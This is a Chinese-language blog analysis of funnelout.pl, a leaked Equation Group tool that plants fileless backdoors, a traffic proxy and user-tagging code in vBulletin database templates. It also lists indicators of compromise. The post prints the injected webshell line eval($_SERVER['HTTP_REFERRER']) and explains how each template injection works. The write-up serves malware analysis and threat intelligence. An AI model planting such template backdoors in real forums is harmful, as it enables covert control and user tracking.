---
title: vBulletin 论坛定向攻击脚本分析
date: 2018-02-05 17:18:38
tags: [backdoor,sec,vBulletin,Equation Group]
categories: Security
---
<script src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js"></script>

花了几天时间研究了一下Equation Group泄露的针对`vBulletin`论坛的定向攻击工具，期间非常感谢[风流@逢魔安全实验室](https://mp.weixin.qq.com/s/5WRXpljL7RFSPRQ2NdHhtA)的帮助，最主要的动力也是在技术分享上听了这个课题，感觉非常有意思，于是搭了环境研究了利用过程，期间也踩了好几个坑，整个过程下来却感受到脚本作者扎实的代码功底和缜密的逻辑，虽然是“过时”的工具了却有很多值得学习的地方。另外，这个过程是参考[Equation Group泄露工具之vBulletin无文件后门分析](https://paper.seebug.org/517/)进行的，只是把其中碰到的一些问题梳理一下，大家可以结合着看，希望能起到帮助。

### 0x01 概述
vBulletin是国外知名的论坛程序，使用广泛，但在国内见得不多。程序算得上比较古老，披露的漏洞也不算少，但是针对这个系统的集成利用工具还是非方程式这个莫属，攻击工具高度融合论坛本身的代码逻辑，无论是安插后门还是插入代理，全程都是无文件攻击，是真正“高级持续化威胁”的典型例子。

### 0x02 脚本介绍
攻击脚本名为`funnelout.pl`，在方程式工具包的`linux/up`目录下，[github](https://github.com/x0rz/EQGRP)上有完整的解压缩后的文件，本文件[地址](https://github.com/x0rz/EQGRP/blob/master/Linux/up/funnelout.v4.1.0.1.pl)

它一共有三个版本，v3.0.0.1, v4.0.0.1和v4.1.0.1，内容上大同小异，新版本修改和增加了几处代码，我们就选择v4.1.0.1来研究。
脚本基于perl语言编写，x0rz给它的介绍是

> FUNNELOUT: database-based web-backdoor for vbulletin

可以看出它是基于数据库的后门，也就是说攻击过程中不会生成文件，传统安全评估漏洞扫描之类的很难发现这种后门，再根据脚本生成的攻击代码中出现的一个时间戳`1258466920`，推测开发时间大致在2009年11月份，如果真是这样，10年前的攻击工具现在看来依旧非常牛逼，用@风流的话来说“细思极恐”。

### 0x03 环境搭建
`funnelout.pl`中涉及到的`vBulletin`版本是3和4，所以我们选择`vBulletin v3.8.6`来测试。提一句这套系统的代码好难找，官网仅开放下载给注册会员，而且现在已经更新到v5.x，所以需要代码的同学可以联系我。

安装时在建立数据库的过程中可能出现设置默认日期`0000-00-00`的错误，这应该和mysql的版本有关，可以选择低版本的mysql，也可以修改`upload\install\mysql-schema.php`，将默认的`0000-00-00`为`1000-01-01`。

另外如果安装过程中设置了数据库表名的前缀，那么需要修改`$DB_table`和`$DB_datastore`涉及sql语句的部分，例如`SELECT title FROM datastore`修改为`SELECT title FROM $DB_datastore`，其中`$DB_datastore`需要自己声明。

其它的可以参考说明文档，这里不再赘述。

### 0x04 复现&分析
在分析代码之前我们先了解一下`vBulletin`的设计逻辑，特别是在模板渲染方面。

程序在安装过程中会通过`includes/adminfunctions_template.php`加载xml文件`install/vbulletin-language.xml`，里面定义了基本的样式，根据样式的`id`取出对应的内容插入到数据表`template`中，渲染过程则是相反，根据模板的`title`加载进程序，进行前端渲染，因此才能够被“无文件“安装后门，这算是论坛当初设计时一个比较明显的缺陷吧。将后门代码插入在模板中本身不容易被发现，更何况模板不以文件的方式存在而是储存在数据库中，这也为这个攻击工具提供了很好的隐蔽方式，同时也能解释脚本使用时需要指定数据库连接，因为它本身是直接对数据库进行操作的。

来看一下脚本的整体功能

![funnelout.pl](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/TbgPz)

`-op`参数展示了可以选择的操作，最主要的是`door`,`proxy`和`tag`功能，以及相应的`show`操作，我们也是选择这三部分功能进行分析

因为脚本是直接对数据库进行操作，所以需要指定数据库的连接信息，也可以指定`-conf`参数跟上论坛的配置文件，脚本会自动提取里面的基本信息。其他的参数就是字面意思，包括设置ssl，要包括及排除的用户，设置黑名单等等，可以看出脚本的功能是相当强大的。

#### Backdoor 功能分析
这应该是脚本最简单粗暴的方法，直接在数据库中插入后门代码，之后通过HTTP请求中的`Referrer`字段发送指令，注意此处是`Referrer`而不是默认的`Referer`，隐蔽性非常好。

![backdoor](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/uLFsU)

看一下插入后门的方法(在脚本中打印了执行的sql语句来方便理解)，可以看到插入后门的操作对页脚模板插入了一段base64编码后的代码`eval($_SERVER["HTTP_REFERRER"]);`，在页面渲染页脚部分时就会加载恶意代码，攻击者就可以通过`HTTP_REFERRER`字段下发指令，利用非常简单。我们来看一下它具体是如何实现的

![op_door](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/TPKug)
![patch_db](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/J1Q9m)

很简单的逻辑，将base64编码后的一句话代码插入`template`表的`footer`模板下，在`global.php`调用过程中被加载执行。

![global.php](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/06Abt)

![debug](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/wSBon)

![phpinfo](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/Eumco)

#### Proxy 功能分析
Proxy功能相对复杂一些，但也离不开对模板的操作，它涉及的是`header`模板

![proxyTemplate](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/gGsRT)
![op_proxy](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/KS5ci)

使用proxy时需要指定一个`tag`，而且tagurl需要符合正则表达式`/(.+?)\/.+?\/.+?\/(.+?)\/\d+\/(.+?)\/(.*)/`也就是`x.x.x.x/a/b/c/1/d/`的格式，这地方是个坑...

指定tagurl生成相应的proxy代码

![proxy](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/1UrLg)
解码后

![proxy code](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/oXMfY)

`$fahost`就是我们指定的tag的ip。当满足if条件——请求路径中含有`/`且ip不是`64.38.3.50`时，`header`渲染过程中会加载这些php代码，构造一个请求发送给我们的tagUrl。值得注意的是这里不仅支持GET请求，同样支持POST请求，也就是说我们可以作为“中间人”的角色时刻监听着用户与论坛之间的通信，实现了真正意义上的代理，而且用户在这过程中完全无法察觉到，细思极恐...

![proxy request](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/jEOhg)

可以确定的是`64.38.3.50`这个ip一定与攻击组织有关，也许在测试的时候就将此ip排除在外，避免一些麻烦，同时这也是整个脚本泄露的唯一一个确定的ip。

#### Tag 功能分析

![op_tag](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/NXTqW)
Tag功能更加复杂，操作`navbar`模板，使用时有这么几个选项可以指定，`-tag`指定标记的url，`-nohttp`表示不自动加上`http://`，这种情况可以在正常访问时嵌入一个网站本身的url，`-f`Force，还有`ssl`选项，适用于https的情况。

我们先用`-tag`指定一个`tag URL`

![tag](http://ob5vt1k7f.qnssl.com/yProo)

base64解码后的代码长这样

![tag code](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/kLa7C)

当我们访问文章页面`http://127.0.0.1/vb3/showthread.php?p=1`或访问私信链接`http://127.0.0.1/vb3/private.php?do=showpm&pmid=1`时，就会加载php代码，在`datastore`表生成一个“标签”——插入一个序列化后的`data`字段，类似`a:2:{i:0;i:1517970003;i:1;i:1;}`，其中最后的`i`是一个计数器，值在随机数[0,6]之间，每次访问页面时i值递减1，当i减到0时就会触发代码，向我们设置的`tag URL`发送用户名经过hex编码后的页面地址

![tag code1](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/FgW6h)
![61646d696e.html](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/pkQsP)
![61646d696e req](http://ob5vt1k7f.qnssl.com/qmk8S)(此处便于理解换了一个tag URL，并且新建了61646d696e.html文件)

同时`tag`减至`-1`并出于等待重置状态，当我们进行`reset`操作时就会清空这条“标签”数据

![showTagged](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/0wgAc)
![reset](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/szepl)

值得注意的是，“标签”功能只在一天内有效，超过一天后就无法触发，只能先进行重置操作

- `-nohttp`选项

当使用`-nohttp`时，生成url后就可以请求网站本身的路径+hex(用户名)的页面，但是这个页面不一定存在，所以一时没想明白为什么这样设置。而没有设置`-nohttp`时可以向我们自定义地址发送请求，结合脚本的功能推测是给访问某些特定页面的用户做一个标记，便于以后再定向攻击。

- `-crumb`选项

指定了`-crumb`选项后则是在页面嵌入一张1x1的图片，加载的是`images/`目录下的`hex(用户名).gif`，属性设置为不可见，这块的功能也没有理解透彻，总之会传递一个用户名信息，用户不知不觉中就被标记上了，细思极恐again...


### 0x05 特征
截图中也注意到了两个特殊的md5
```
84b8026b3f5e6dcfb29e82e0b0b0f386 Unregistered (EN)
e6d290a03b70cfa5d4451da444bdea39 dbedd120e3d3cce1 (AR)
```
这也是攻击脚本中硬编码的“黑名单”，或许理解为“白名单”更合适？

另外有几个ip段，地理位置分布在各个国家
```
'/^(64.38.3.50|195.28.|94.102.|91.93.|41.130.|212.118.|79.173.|85.159.|94.249.|86.108.)/'
```

而根据另一个特殊的字符串`l9ed39e2fea93e5`搜索，发现网上存在可能被攻击的案例，里面出现了一个域名`http://technology-revealed.com`

![technology-revealed](https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/OFkMN)

这几条线索之间的关系不得而知，或许对威胁情报能起到一起参考作用，虽然这个APT攻击已经过去好多年了。


### 0x06 总结
方程式泄露的工具包对整个世界带来了巨大的影响，像“永恒之蓝”甚至成为了目前勒索病毒和挖矿木马的标配，而这个针对vb论坛的攻击工具仅仅是里面的一个文件，整个工具包里还隐藏着什么威力巨大的武器，真值得我们好好研究。单从`funnelout.v4.1.0.1.pl`这个脚本看虽然它的利用面可能没那么广了，但作者的思维角度和攻击方法依旧没有过时，值得学习。


### 0x07 参考
- https://paper.seebug.org/517/
- https://github.com/x0rz/EQGRP
- https://stackoverflow.com/questions/36374335/error-in-mysql-when-setting-default-value-for-date-or-datetime


<script>pangu.spacingPage();</script>




